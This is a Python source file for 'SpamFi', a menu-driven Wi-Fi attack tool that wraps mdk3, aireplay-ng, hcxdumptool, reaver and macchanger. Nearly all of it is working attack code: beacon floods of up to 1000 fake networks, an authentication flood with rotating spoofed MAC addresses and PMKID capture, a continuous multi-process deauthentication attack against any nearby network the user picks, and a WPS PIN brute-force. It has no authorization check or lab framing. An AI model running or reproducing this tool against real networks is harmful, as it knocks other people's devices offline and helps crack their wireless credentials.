#!/usr/bin/env python3

import os
import sys
import subprocess
import time
from typing import List
import re
from colorama import init, Fore, Style
import random

class WifiTester:
    def __init__(self):
        init()  # Initialize colorama
        self.interface = None
        self.running_attacks = []
        self.print_banner()
        self.check_root()
        self.check_and_install_tools()

    def print_banner(self):
        """Display a stylish banner"""
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════╗
║   {Fore.RED}███████{Fore.WHITE}╗{Fore.RED}██████{Fore.WHITE}╗  {Fore.RED}█████{Fore.WHITE}╗ {Fore.RED}███{Fore.WHITE}╗   {Fore.RED}███{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.RED}██{Fore.WHITE}╗   ║
║   {Fore.RED}██{Fore.WHITE}╔════╝{Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}╗{Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}╗{Fore.RED}████{Fore.WHITE}╗ {Fore.RED}████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔════╝{Fore.RED}██{Fore.WHITE}║   ║
║   {Fore.RED}███████{Fore.WHITE}╗{Fore.RED}██████{Fore.WHITE}╔╝{Fore.RED}███████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔{Fore.RED}████{Fore.WHITE}╔{Fore.RED}██{Fore.WHITE}║{Fore.RED}█████{Fore.WHITE}╗  {Fore.RED}██{Fore.WHITE}║   ║
║   {Fore.WHITE}╚════{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔═══╝ {Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║╚{Fore.RED}██{Fore.WHITE}╔╝{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔══╝  {Fore.RED}██{Fore.WHITE}║   ║
║   {Fore.RED}███████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║     {Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║ ╚═╝ {Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║     {Fore.RED}██{Fore.WHITE}║   ║
║   {Fore.WHITE}╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝   ║
║                                                   ║
║   {Fore.GREEN}Created By: Caro Nero{Fore.CYAN}                        ║
║   {Fore.WHITE}Version: {Fore.GREEN}2.0{Fore.CYAN}                                    ║
╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def print_status(self, message, status="info"):
        """Print formatted status messages"""
        symbols = {
            "info": f"{Fore.BLUE}[*]{Style.RESET_ALL}",
            "success": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
            "error": f"{Fore.RED}[-]{Style.RESET_ALL}",
            "warning": f"{Fore.YELLOW}[!]{Style.RESET_ALL}"
        }
        print(f"{symbols.get(status, '[*]')} {message}")

    def check_root(self):
        """Check if the script is running with root privileges"""
        if os.geteuid() != 0:
            self.print_status("This script must be run as root!", "error")
            print(f"\n{Fore.YELLOW}Run with: {Fore.GREEN}sudo python3 {sys.argv[0]}{Style.RESET_ALL}")
            sys.exit(1)

    def check_and_install_tools(self):
        """Check and install required tools"""
        required_tools = {
            'mdk3': 'mdk3',
            'airmon-ng': 'aircrack-ng',
            'iwconfig': 'wireless-tools',
            'iw': 'iw',
            'tcpdump': 'tcpdump',
            'hostapd': 'hostapd',
            'hcxdumptool': 'hcxdumptool',
            'macchanger': 'macchanger'
        }
        
        missing_tools = []
        
        for tool, package in required_tools.items():
            try:
                subprocess.run(['which', tool], check=True, capture_output=True)
            except subprocess.CalledProcessError:
                missing_tools.append(package)
        
        if missing_tools:
            self.print_status("Detected missing required tools:", "warning")
            for tool in missing_tools:
                print(f"- {tool}")
            self.print_status("Attempting automatic installation...", "info")
            self.install_tools(missing_tools)
        else:
            self.print_status("All required tools are installed.", "success")

    def install_tools(self, tools: List[str]):
        """Install missing tools"""
        try:
            subprocess.run(['apt-get', 'update'], check=True, capture_output=True)
            for tool in tools:
                self.print_status(f"Installing {tool}...", "info")
                subprocess.run(['apt-get', 'install', '-y', tool], check=True)
                self.print_status(f"Successfully installed {tool}", "success")
        except subprocess.CalledProcessError as e:
            self.print_status(f"Error installing tools: {e}", "error")
            sys.exit(1)

    def show_menu(self):
        """Display interactive menu"""
        while True:
            print(f"\n{Fore.CYAN}╔══ WiFi Testing Tool Menu ══╗{Style.RESET_ALL}")
            options = [
                "List Available Wireless Adapters",
                "Enable Monitor Mode",
                "Beacon Flood Attack",
                "Authentication DOS Attack",
                "Deauthentication Attack",
                "WPS Attack",
                "Network Traffic Analysis",
                "Save Last Scan Results",
                "Disable Monitor Mode",
                "Exit"
            ]
            for i, option in enumerate(options, 1):
                print(f"{Fore.YELLOW}{i}{Style.RESET_ALL}. {option}")
            print(f"{Fore.CYAN}╚════════════════════════════╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.GREEN}Select an option (1-10):{Style.RESET_ALL} ")
            
            if choice == '1':
                self.list_adapters()
            elif choice == '2':
                self.setup_monitor_mode()
            elif choice == '3':
                self.start_beacon_flood()
            elif choice == '4':
                self.start_auth_attack()
            elif choice == '5':
                self.start_deauth_attack()
            elif choice == '6':
                self.start_wps_attack()
            elif choice == '7':
                self.analyze_network_traffic()
            elif choice == '8':
                self.save_last_scan()
            elif choice == '9':
                self.disable_monitor_mode()
            elif choice == '10':
                print("\nExiting...")
                self.print_status("Goodbye!", "success")
                self.cleanup()
                sys.exit(0)
            else:
                self.print_status("Invalid option. Please try again.", "error")

    def list_adapters(self):
        """List all available wireless adapters"""
        print(f"\n{Fore.CYAN}╔══════════ Available Wireless Adapters ══════════╗{Style.RESET_ALL}")
        interfaces = self.get_wireless_interfaces()
        if interfaces:
            for i, interface in enumerate(interfaces, 1):
                try:
                    result = subprocess.run(['iwconfig', interface], 
                                         capture_output=True, text=True)
                    details = result.stdout.strip()
                    
                    # Parse the iwconfig output
                    mode = re.search(r"Mode:(\w+)", details)
                    essid = re.search(r"ESSID:\"?([^\"]*)\"?", details)
                    power = re.search(r"Tx-Power=(\d+)", details)
                    ap = re.search(r"Access Point: ([^ ]+)", details)
                    
                    print(f"\n{Fore.GREEN}╔═ Interface #{i} ═══════════════════════════╗{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}║ Name:{Style.RESET_ALL} {interface}")
                    print(f"{Fore.YELLOW}║ Mode:{Style.RESET_ALL} {mode.group(1) if mode else 'Unknown'}")
                    print(f"{Fore.YELLOW}║ ESSID:{Style.RESET_ALL} {essid.group(1) if essid else 'Not Set'}")
                    print(f"{Fore.YELLOW}║ Power:{Style.RESET_ALL} {power.group(1) + ' dBm' if power else 'Unknown'}")
                    print(f"{Fore.YELLOW}║ Access Point:{Style.RESET_ALL} {ap.group(1) if ap else 'Not Associated'}")
                    print(f"{Fore.GREEN}╚════════════════════════════════════════╝{Style.RESET_ALL}")
                    
                except subprocess.CalledProcessError:
                    print(f"\n{Fore.RED}╔═ Interface #{i} ═══════════════════════════╗")
                    print(f"║ {interface}: Unable to get details")
                    print(f"╚════════════════════════════════════════╝{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}║ No wireless adapters found!")
            print(f"╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}╚══════════════════════════════════════════════╝{Style.RESET_ALL}")
        input(f"\n{Fore.GREEN}Press Enter to continue...{Style.RESET_ALL}")

    def get_wireless_interfaces(self):
        """Get list of available wireless interfaces"""
        interfaces = set()
        
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    interface = line.split()[0]
                    interfaces.add(interface)
        except subprocess.CalledProcessError:
            pass

        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    interface = line.split()[-1]
                    interfaces.add(interface)
        except subprocess.CalledProcessError:
            pass

        return list(interfaces)

    def setup_monitor_mode(self):
        """Interactive monitor mode setup"""
        interfaces = self.get_wireless_interfaces()
        if not interfaces:
            self.print_status("No wireless adapters found!", "error")
            return
        
        print("\nAvailable interfaces:")
        for i, interface in enumerate(interfaces, 1):
            print(f"{i}. {interface}")
        
        try:
            choice = int(input("\nSelect interface number: ")) - 1
            if 0 <= choice < len(interfaces):
                self.interface = interfaces[choice]
                self.check_wireless_card()
                self.enable_monitor_mode()
            else:
                self.print_status("Invalid selection!", "error")
        except ValueError:
            self.print_status("Invalid input!", "error")

    def check_wireless_card(self):
        """Check if the wireless interface exists and supports monitor mode"""
        try:
            result = subprocess.run(['iwconfig', self.interface], 
                                  capture_output=True, 
                                  text=True)
            if "No such device" in result.stderr:
                self.print_status(f"Error: Interface {self.interface} does not exist!", "error")
                sys.exit(1)
            
            result = subprocess.run(['iw', 'list'], 
                                  capture_output=True, 
                                  text=True)
            if "monitor" not in result.stdout:
                self.print_status(f"Error: Interface {self.interface} does not support monitor mode!", "error")
                sys.exit(1)
            
        except subprocess.CalledProcessError as e:
            self.print_status(f"Error checking wireless interface: {e}", "error")
            sys.exit(1)

    def enable_monitor_mode(self):
        """Enable monitor mode on the wireless interface"""
        try:
            # Check if interface is already in monitor mode
            if 'mon' in self.interface:
                self.print_status(f"Interface {self.interface} is already in monitor mode", "success")
                return
            
            self.print_status("Killing interfering processes...", "info")
            subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
            
            self.print_status(f"Enabling monitor mode on {self.interface}...", "info")
            result = subprocess.run(['airmon-ng', 'start', self.interface], 
                                  capture_output=True, text=True, check=True)
            
            # Check for the new interface name in the output
            for line in result.stdout.split('\n'):
                if '(monitor mode enabled on' in line:
                    new_interface = line.split('on')[1].strip().rstrip(')')
                    self.interface = new_interface
                    break
            else:
                # If not found in output, try appending 'mon'
                if not self.interface.endswith('mon'):
                    self.interface = f"{self.interface}mon"
                
            # Verify the interface exists
            subprocess.run(['iwconfig', self.interface], check=True, capture_output=True)
            
            self.print_status(f"Monitor mode enabled on {self.interface}", "success")
            
            print(f"{Fore.GREEN}Initializing", end='')
            for _ in range(3):
                time.sleep(0.5)
                print(".", end='', flush=True)
            print(f"{Style.RESET_ALL}")
            
        except subprocess.CalledProcessError as e:
            self.print_status(f"Failed to enable monitor mode: {e}", "error")
            sys.exit(1)

    def start_beacon_flood(self):
        """Interactive beacon flood setup"""
        # First check if we have an interface set
        if not self.interface:
            self.print_status("No wireless interface selected!", "error")
            self.print_status("Please enable monitor mode first (Option 2)", "info")
            return
        
        # Then check if it's in monitor mode
        if not self.check_monitor_mode():
            self.print_status("Interface is not in monitor mode!", "error")
            self.print_status("Please enable monitor mode first (Option 2)", "info")
            return
        
        try:
            print(f"\n{Fore.CYAN}=== Beacon Flood Attack ==={Style.RESET_ALL}")
            num_networks = int(input(f"{Fore.GREEN}Enter number of networks to create (10-1000):{Style.RESET_ALL} "))
            if 10 <= num_networks <= 1000:
                self.print_status(f"Starting beacon flood with {num_networks} networks...", "info")
                self.beacon_flood(num_networks)
            else:
                self.print_status("Please enter a number between 10 and 1000", "warning")
        except ValueError:
            self.print_status("Invalid input!", "error")

    def beacon_flood(self, num_networks: int):
        """Start beacon flooding with random SSIDs"""
        try:
            # Create a temporary file with random SSIDs
            ssid_file = '/tmp/spamfi_ssids.txt'
            with open(ssid_file, 'w') as f:
                for i in range(num_networks):
                    # Generate random network names with prefix
                    ssid = f"SpamFi-Net_{i:03d}"
                    f.write(ssid + '\n')
            
            # More aggressive beacon flood with custom options
            cmd = [
                'mdk3', 
                self.interface, 
                'b',           # beacon flood mode
                '-f', ssid_file,  # use SSIDs from file
                '-c', '1',     # use channel 1
                '-s', '300',   # packets per second
                '-h'           # hop between channels
            ]
            
            # Run in background and capture process
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.running_attacks.append({
                'type': 'beacon_flood',
                'process': process,
                'networks': num_networks
            })
            
            # Show progress animation
            print(f"\n{Fore.CYAN}Creating {num_networks} fake networks:{Style.RESET_ALL}")
            for i in range(10):
                progress = '=' * i + '>' + ' ' * (9-i)
                print(f"\r[{progress}] {i*10}%", end='', flush=True)
                time.sleep(0.5)
            print(f"\r[==========] 100%")
            
            self.print_status(f"Broadcasting {num_networks} fake networks", "success")
            self.print_status("Networks will appear as SpamFi-Net_001 through SpamFi-Net_{num_networks:03d}", "info")
            self.print_status("Press Ctrl+C to stop the attack", "info")
            
            # Wait for user interrupt
            try:
                process.wait()
            except KeyboardInterrupt:
                process.terminate()
                # Cleanup
                try:
                    os.remove(ssid_file)
                except:
                    pass
                self.print_status("Beacon flood attack stopped", "warning")
                
        except subprocess.CalledProcessError as e:
            self.print_status(f"Beacon flood failed: {e}", "error")
        except Exception as e:
            self.print_status(f"Error: {str(e)}", "error")

    def start_auth_attack(self):
        """Interactive authentication attack setup"""
        if not self.interface:
            self.print_status("Please enable monitor mode first!", "warning")
            return
        
        # Scan for networks
        self.print_status("Scanning for available networks...", "info")
        networks = self.scan_networks()
        
        if not networks:
            self.print_status("No networks found. Please try again.", "error")
            return
        
        # Display networks
        print(f"\n{Fore.CYAN}╔══════════ Available Networks ══════════╗{Style.RESET_ALL}")
        for i, network in enumerate(networks, 1):
            print(f"{Fore.YELLOW}{i}{Style.RESET_ALL}. BSSID: {network['bssid']} | ESSID: {network['essid']} | Channel: {network['channel']}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Choose network
        try:
            choice = int(input(f"\n{Fore.GREEN}Select network number:{Style.RESET_ALL} ")) - 1
            if 0 <= choice < len(networks):
                target_bssid = networks[choice]['bssid']
                self.authentication_dos(target_bssid)
            else:
                self.print_status("Invalid selection!", "error")
        except ValueError:
            self.print_status("Invalid input!", "error")

    def scan_networks(self):
        """Scan for available networks and return a list of BSSIDs and ESSIDs"""
        networks = []
        
        try:
            self.print_status("Starting network scan (this will take 15 seconds)...", "info")
            
            # First try with iwlist scan
            try:
                result = subprocess.run(['iwlist', self.interface, 'scan'],
                                      capture_output=True,
                                      text=True,
                                      timeout=5)
                
                current_network = {}
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    if "Cell" in line and "Address:" in line:
                        if current_network:
                            networks.append(current_network)
                        current_network = {'bssid': line.split("Address: ")[1]}
                    elif "ESSID:" in line:
                        essid = line.split('ESSID:"')[1].rstrip('"')
                        current_network['essid'] = essid if essid else '<Hidden Network>'
                    elif "Channel:" in line:
                        current_network['channel'] = line.split(":")[1]
                    elif "Quality=" in line:
                        # Convert quality to power
                        quality = line.split("=")[1].split("/")[0]
                        current_network['power'] = str(int(quality) - 100)
                
                if current_network:
                    networks.append(current_network)
                    
            except subprocess.TimeoutExpired:
                self.print_status("Scan timeout, trying alternative method...", "warning")
            
            # If iwlist didn't work, try airodump-ng
            if not networks:
                temp_file = '/tmp/spamfi_scan'
                os.system('rm -f /tmp/spamfi_scan*')
                
                cmd = [
                    'airodump-ng',
                    '--output-format', 'csv',
                    '--write', temp_file,
                    self.interface
                ]
                
                process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Show scanning progress
                for i in range(15):
                    progress = '=' * i + '>' + ' ' * (14-i)
                    print(f"\r{Fore.CYAN}[{progress}] {int((i/15)*100)}% Scanning...{Style.RESET_ALL}", 
                          end='', flush=True)
                    time.sleep(1)
                    
                process.terminate()
                
                # Parse airodump-ng results
                csv_file = f"{temp_file}-01.csv"
                if os.path.exists(csv_file):
                    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines[1:]:  # Skip header
                            if line.strip() and ',' in line:
                                parts = line.split(',')
                                if len(parts) >= 14:
                                    bssid = parts[0].strip()
                                    if bssid and ':' in bssid:
                                        networks.append({
                                            'bssid': bssid,
                                            'essid': parts[13].strip() or '<Hidden Network>',
                                            'channel': parts[3].strip() or 'Unknown',
                                            'power': parts[8].strip() or '0'
                                        })
                
                os.system('rm -f /tmp/spamfi_scan*')
            
            if not networks:
                self.print_status("No networks found. Try these steps:", "warning")
                print(f"{Fore.YELLOW}1. Move to a location with more networks")
                print("2. Make sure your adapter supports monitor mode")
                print("3. Try restarting monitor mode")
                print(f"4. Check if your adapter supports the current band{Style.RESET_ALL}")
            else:
                networks.sort(key=lambda x: int(x.get('power', '0')) if x.get('power', '0').strip('-').isdigit() else -999, reverse=True)
                self.print_status(f"Found {len(networks)} networks!", "success")
                
        except Exception as e:
            self.print_status(f"Error during network scan: {e}", "error")
        
        self.last_scan_results = networks
        return networks

    def authentication_dos(self, target_bssid: str):
        """Enhanced Authentication DOS with client spoofing and PMKID attacks"""
        try:
            # First, gather more information about the target
            self.print_status(f"Analyzing target network {target_bssid}...", "info")
            
            # Get target channel
            channel = None
            for net in self.last_scan_results:
                if net['bssid'] == target_bssid:
                    channel = net['channel']
                    break
            
            if not channel:
                self.print_status("Could not determine target channel", "error")
                return
            
            # Set interface to correct channel
            subprocess.run(['iwconfig', self.interface, 'channel', channel],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
            
            # Generate multiple spoofed MAC addresses
            mac_addresses = []
            for _ in range(10):
                mac = ':'.join(['%02x'%random.randint(0,255) for _ in range(6)])
                mac_addresses.append(mac)
            
            processes = []
            
            # 1. PMKID attack
            cmd1 = [
                'hcxdumptool',
                '-i', self.interface,
                '-o', '/tmp/pmkid.pcapng',
                '--enable_status=1',
                '--active_beacon',
                '--flood_beacon',
                '--flood_association',
                '--flood_authentication',
                '--flood_pmkid',
                '-c', channel
            ]
            
            # 2. Enhanced MDK3 attack
            cmd2 = [
                'mdk3',
                self.interface,
                'a',
                '-a', target_bssid,
                '-m',
                '-i', target_bssid,
                '-s', '2000'
            ]
            
            # 3. Aireplay-ng with multiple MAC addresses
            for mac in mac_addresses:
                cmd = [
                    'aireplay-ng',
                    '-1', '0',
                    '-a', target_bssid,
                    '-h', mac,
                    '--ignore-negative-one',
                    self.interface
                ]
                processes.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            
            # Start main attacks
            processes.append(subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            processes.append(subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            
            self.print_status(f"Starting enhanced authentication attack...", "info")
            print(f"\n{Fore.RED}Multi-Vector Authentication Attack Running{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Target: {target_bssid} on Channel {channel}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Using {len(mac_addresses)} spoofed clients{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}Press Ctrl+C to stop the attack{Style.RESET_ALL}")
            
            try:
                attack_time = 0
                while True:
                    # Rotate MAC addresses every 10 seconds
                    if attack_time % 10 == 0:
                        for mac in mac_addresses:
                            new_mac = ':'.join(['%02x'%random.randint(0,255) for _ in range(6)])
                            subprocess.run(['macchanger', '-m', new_mac, self.interface],
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL)
                    
                    print(f"\r{Fore.RED}[+] Attack running for {attack_time}s | "
                          f"Channel: {channel} | "
                          f"MACs: {len(mac_addresses)} | "
                          f"Target: {target_bssid}{Style.RESET_ALL}", 
                          end='', flush=True)
                    time.sleep(1)
                    attack_time += 1
                    
            except KeyboardInterrupt:
                print("\n")
                for p in processes:
                    p.terminate()
                self.print_status("Attack stopped", "warning")
                
        except Exception as e:
            self.print_status(f"Error: {str(e)}", "error")
        finally:
            # Cleanup
            try:
                os.remove('/tmp/pmkid.pcapng')
            except:
                pass

    def disable_monitor_mode(self):
        """Disable monitor mode and restore normal operation"""
        if not self.interface:
            self.print_status("No interface in monitor mode!", "warning")
            return
        
        try:
            # Stop any running attacks first
            for attack in self.running_attacks:
                if 'process' in attack:
                    attack['process'].terminate()
            self.running_attacks.clear()

            # Disable monitor mode
            subprocess.run(['airmon-ng', 'stop', self.interface], check=True)
            
            # Try different network manager services (for different distros)
            network_managers = [
                'NetworkManager',
                'network-manager',
                'networking',
                'networkmanager'
            ]
            
            service_started = False
            for nm in network_managers:
                try:
                    subprocess.run(['service', nm, 'start'], 
                                 check=True, 
                                 capture_output=True)
                    service_started = True
                    break
                except subprocess.CalledProcessError:
                    continue
            
            if not service_started:
                self.print_status("Note: Network manager service not found. You may need to restart networking manually.", "warning")
            
            # Reset interface name
            self.interface = self.interface.replace('mon', '')
            self.print_status(f"Disabled monitor mode on {self.interface}", "success")
            self.interface = None
            
        except subprocess.CalledProcessError as e:
            self.print_status(f"Note: Some cleanup operations failed, but monitor mode was disabled", "warning")
        except Exception as e:
            self.print_status(f"Error during cleanup: {str(e)}", "error")

    def cleanup(self):
        """Clean up before exit"""
        try:
            # Stop any running attacks
            for attack in self.running_attacks:
                if 'process' in attack:
                    attack['process'].terminate()
            
            # Disable monitor mode if enabled
            if self.interface and 'mon' in self.interface:
                self.disable_monitor_mode()
            
            # Remove temporary files
            os.system('rm -f /tmp/spamfi_*')
        except Exception as e:
            self.print_status(f"Error during cleanup: {e}", "error")

    def check_monitor_mode(self):
        """Check if interface is in monitor mode"""
        if not self.interface:
            return False
        
        try:
            result = subprocess.run(['iwconfig', self.interface], 
                                  capture_output=True, 
                                  text=True)
            return 'Mode:Monitor' in result.stdout.replace(" ", "")  # Remove spaces to handle variations
        except:
            return False

    def save_last_scan(self):
        """Save the results of the last network scan"""
        if not hasattr(self, 'last_scan_results'):
            self.print_status("No scan results available. Please perform a scan first.", "warning")
            return
        
        filename = input(f"{Fore.GREEN}Enter filename to save results (default: scan_results.txt):{Style.RESET_ALL} ").strip()
        if not filename:
            filename = "scan_results.txt"
        
        self.save_results(self.last_scan_results, filename)

    def analyze_network_traffic(self):
        """Capture and analyze network traffic"""
        if not self.check_monitor_mode():
            self.print_status("Please enable monitor mode first!", "warning")
            return
        
        try:
            output_file = f"/tmp/spamfi_capture_{int(time.time())}.pcap"
            self.print_status("Starting traffic capture (Ctrl+C to stop)...", "info")
            
            # Modified capture command for better results
            cmd = [
                'tcpdump',
                '-i', self.interface,
                '-w', output_file,
                '-s', '0',        # Full packet capture
                '-n',             # Don't resolve addresses
                '-e',            # Get link-level header
                '-vv',           # Very verbose output
                'not', '(type', 'mgt', 'subtype', 'beacon)',  # Exclude beacon frames
                'and', 'type', 'radio'  # Include all radio frames
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            
            # Show real-time statistics with packet counter
            start_time = time.time()
            last_size = 0
            
            try:
                while True:
                    # Get current file size
                    size = os.path.getsize(output_file) if os.path.exists(output_file) else 0
                    duration = int(time.time() - start_time)
                    
                    # Calculate packet rate
                    delta = size - last_size
                    rate = delta / 1024  # KB/s
                    last_size = size
                    
                    # Update statistics with more info
                    print(f"\r{Fore.CYAN}[+] Duration: {duration}s | "
                          f"Captured: {size/1024:.2f} KB | "
                          f"Rate: {rate:.2f} KB/s | "
                          f"Channel: {self.get_current_channel()}{Style.RESET_ALL}", 
                          end='', flush=True)
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                process.terminate()
                print("\n")
                
                if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                    self.print_status(f"Capture saved to: {output_file}", "success")
                    self.print_status("You can analyze this file with Wireshark", "info")
                    self.print_status(f"Total captured: {os.path.getsize(output_file)/1024:.2f} KB", "info")
                else:
                    self.print_status("No packets were captured", "warning")
                    self.print_status("Try these troubleshooting steps:", "info")
                    print(f"{Fore.YELLOW}1. Make sure you're close to active networks")
                    print("2. Try changing channels manually")
                    print("3. Verify your wireless adapter supports packet injection")
                    print(f"4. Check if monitor mode is working correctly{Style.RESET_ALL}")
                    
        except Exception as e:
            self.print_status(f"Error during capture: {str(e)}", "error")

    def start_wps_attack(self):
        """Start WPS PIN attack"""
        if not self.check_monitor_mode():
            self.print_status("Please enable monitor mode first!", "warning")
            return
        
        # Scan for networks
        self.print_status("Scanning for networks...", "info")
        networks = self.scan_networks()
        
        if not networks:
            return
        
        # Show networks
        print(f"\n{Fore.CYAN}╔══════════ Available Networks ══════════╗{Style.RESET_ALL}")
        for i, network in enumerate(networks, 1):
            print(f"{Fore.YELLOW}{i}{Style.RESET_ALL}. BSSID: {network['bssid']} | ESSID: {network['essid']} | Channel: {network['channel']}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        try:
            choice = int(input(f"\n{Fore.GREEN}Select target network:{Style.RESET_ALL} ")) - 1
            if 0 <= choice < len(networks):
                target = networks[choice]
                
                # Start reaver attack
                cmd = [
                    'reaver',
                    '-i', self.interface,
                    '-b', target['bssid'],
                    '-c', target['channel'],
                    '-vv'  # verbose output
                ]
                
                self.print_status(f"Starting WPS attack on {target['essid']}", "info")
                self.print_status("This may take several hours. Press Ctrl+C to stop.", "warning")
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_attacks.append({
                    'type': 'wps',
                    'process': process,
                    'target': target['bssid']
                })
                
                try:
                    while True:
                        output = process.stdout.readline().decode()
                        if output:
                            print(output.strip())
                except KeyboardInterrupt:
                    process.terminate()
                    self.print_status("WPS attack stopped", "warning")
                    
            else:
                self.print_status("Invalid selection!", "error")
        except ValueError:
            self.print_status("Invalid input!", "error")
        except Exception as e:
            self.print_status(f"Error: {str(e)}", "error")

    def get_current_channel(self):
        """Get current channel of interface"""
        try:
            result = subprocess.run(['iwconfig', self.interface], 
                                  capture_output=True, 
                                  text=True)
            match = re.search(r'Channel[=:](\d+)', result.stdout)
            return match.group(1) if match else '?'
        except:
            return '?'

    def start_deauth_attack(self):
        """Start deauthentication attack with multiple methods"""
        if not self.check_monitor_mode():
            self.print_status("Please enable monitor mode first!", "warning")
            return
        
        # Scan for networks
        self.print_status("Scanning for available networks...", "info")
        networks = self.scan_networks()
        
        if not networks:
            self.print_status("No networks found. Please try again.", "error")
            return
        
        # Display networks
        print(f"\n{Fore.CYAN}╔══════════ Available Networks ══════════╗{Style.RESET_ALL}")
        for i, network in enumerate(networks, 1):
            print(f"{Fore.YELLOW}{i}{Style.RESET_ALL}. BSSID: {network['bssid']} | ESSID: {network['essid']} | Channel: {network['channel']}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════╝{Style.RESET_ALL}")
        
        try:
            choice = int(input(f"\n{Fore.GREEN}Select target network:{Style.RESET_ALL} ")) - 1
            if 0 <= choice < len(networks):
                target = networks[choice]
                
                # Set interface to correct channel
                subprocess.run(['iwconfig', self.interface, 'channel', target['channel']],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                
                # Create temporary files
                with open('/tmp/target_ap', 'w') as f:
                    f.write(target['bssid'])
                
                # Start multiple attack processes
                processes = []
                
                # 1. Aireplay-ng deauth
                cmd1 = [
                    'aireplay-ng',
                    '--deauth', '0',  # Continuous deauth
                    '-D',  # Skip AP detection
                    '--ignore-negative-one',
                    '-a', target['bssid'],
                    self.interface
                ]
                
                # 2. MDK3 deauth mode
                cmd2 = [
                    'mdk3',
                    self.interface,
                    'd',  # Deauth mode
                    '-b', '/tmp/target_ap',  # Blacklist file
                    '-c', target['channel']  # Channel
                ]
                
                # 3. MDK3 authentication DoS
                cmd3 = [
                    'mdk3',
                    self.interface,
                    'a',  # Authentication DoS mode
                    '-a', target['bssid'],
                    '-m'  # Maximum speed
                ]
                
                # 4. Aireplay-ng broadcast deauth
                cmd4 = [
                    'aireplay-ng',
                    '--deauth', '0',
                    '-D',
                    '--ignore-negative-one',
                    '-a', target['bssid'],
                    '--broadcast',  # Target all clients
                    self.interface
                ]
                
                self.print_status(f"Starting multi-vector deauth attack on {target['essid']}", "info")
                self.print_status("Press Ctrl+C to stop the attack", "info")
                
                # Start all processes
                processes.append(subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                processes.append(subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                processes.append(subprocess.Popen(cmd3, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                processes.append(subprocess.Popen(cmd4, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
                
                for p in processes:
                    self.running_attacks.append({
                        'type': 'deauth',
                        'process': p,
                        'target': target['bssid']
                    })
                
                try:
                    attack_time = 0
                    while True:
                        print(f"\r{Fore.RED}[+] Multi-vector attack running for {attack_time}s on {target['bssid']} (Channel {target['channel']}){Style.RESET_ALL}", 
                              end='', flush=True)
                        time.sleep(1)
                        attack_time += 1
                except KeyboardInterrupt:
                    print("\n")
                    for p in processes:
                        p.terminate()
                    os.remove('/tmp/target_ap')
                    self.print_status("Attack stopped", "warning")
                    
            else:
                self.print_status("Invalid selection!", "error")
        except ValueError:
            self.print_status("Invalid input!", "error")
        except Exception as e:
            self.print_status(f"Error: {str(e)}", "error")

def main():
    try:
        tester = WifiTester()
        tester.show_menu()
    except KeyboardInterrupt:
        print("\n\nExiting...")
        tester.cleanup()
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main() 